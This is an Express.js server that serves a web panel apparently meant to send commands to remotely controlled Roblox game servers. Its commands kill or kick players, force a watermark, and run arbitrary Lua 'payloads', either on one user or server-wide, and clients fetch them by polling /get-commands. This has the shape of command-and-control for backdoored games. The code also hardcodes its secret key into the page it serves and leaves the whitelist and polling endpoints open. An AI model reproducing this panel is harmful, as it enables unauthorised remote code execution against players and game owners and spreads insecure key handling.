const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

const SECRET_KEY = "MySuperSecret123"; 
let whitelistedUsers = []; 
let pendingCommand = null;

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Roblox Admin Panel</title>
            <style>
                body { font-family: 'Segoe UI', sans-serif; padding: 20px; background: #0f0f0f; color: #e0e0e0; text-align: center; }
                .card { background: #1a1a1a; padding: 20px; margin-bottom: 15px; border-radius: 12px; border: 1px solid #333; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
                h1 { color: #007bff; margin-bottom: 25px; }
                textarea { width: 95%; height: 180px; background: #000; border: 1px solid #444; color: #00ff00; font-family: 'Consolas', monospace; padding: 12px; font-size: 14px; border-radius: 8px; }
                input { padding: 12px; background: #262626; border: 1px solid #444; color: white; border-radius: 6px; margin: 5px; width: 85%; }
                button { padding: 12px 24px; margin: 8px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s; background: #007bff; color: white; }
                .btn-exec { background: #28a745; width: 100%; margin-top: 10px; font-size: 16px; }
                .btn-red { background: #dc3545; }
                button:hover { filter: brightness(1.2); transform: translateY(-1px); }
            </style>
        </head>
        <body>
            <div style="max-width: 700px; margin: auto;">
                <h1>Roblox Command Center</h1>
                
                <div class="card">
                    <h3>Target Selection</h3>
                    <input type="text" id="targetUser" placeholder="Username (Empty = Server-Wide)">
                </div>

                <div class="card">
                    <h3>Quick Actions</h3>
                    <button class="btn-red" onclick="sendCommand('Kill')">Kill</button>
                    <button class="btn-red" onclick="sendCommand('Kick')">Kick</button>
                    <button onclick="sendCommand('LoadWatermark')">Force Watermark</button>
                    <button onclick="joinWhitelist()">Add to Whitelist</button>
                </div>

                <div class="card">
                    <h3>Universal Script Executor</h3>
                    <textarea id="luaCode" placeholder="-- Enter Lua here...\\nprint('System Online')"></textarea>
                    <button class="btn-exec" onclick="sendLua()">DEPLOY SCRIPT</button>
                </div>
            </div>

            <script>
                async function joinWhitelist() {
                    const user = document.getElementById('targetUser').value;
                    if(!user) return alert("Please enter a username!");
                    await fetch('/add-whitelist', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ user })
                    });
                    alert("User " + user + " Whitelisted");
                }

                async function sendCommand(cmd) {
                    const target = document.getElementById('targetUser').value;
                    await fetch('/send-command', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ cmd, key: "${SECRET_KEY}", target })
                    });
                }

                async function sendLua() {
                    const code = document.getElementById('luaCode').value;
                    const target = document.getElementById('targetUser').value;
                    const res = await fetch('/send-command', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ 
                            cmd: 'ULTIMATE_EXEC', 
                            key: "${SECRET_KEY}", 
                            payload: code,
                            target: target 
                        })
                    });
                    if(res.ok) alert("Payload Sent Successfully");
                }
            </script>
        </body>
        </html>
    `);
});

app.post('/add-whitelist', (req, res) => {
    const { user } = req.body;
    if (user && !whitelistedUsers.includes(user)) whitelistedUsers.push(user);
    res.json({ success: true });
});

app.post('/send-command', (req, res) => {
    const { cmd, key, target, payload } = req.body;
    if (key === SECRET_KEY) {
        pendingCommand = { type: cmd, target, data: payload };
        res.json({ success: true });
    } else {
        res.status(403).send("Forbidden");
    }
});

app.get('/get-commands', (req, res) => {
    res.json({
        instruction: pendingCommand || { type: "none" },
        whitelist: whitelistedUsers
    });
    pendingCommand = null; 
});

app.listen(PORT, '0.0.0.0', () => console.log("Admin Panel Live"));
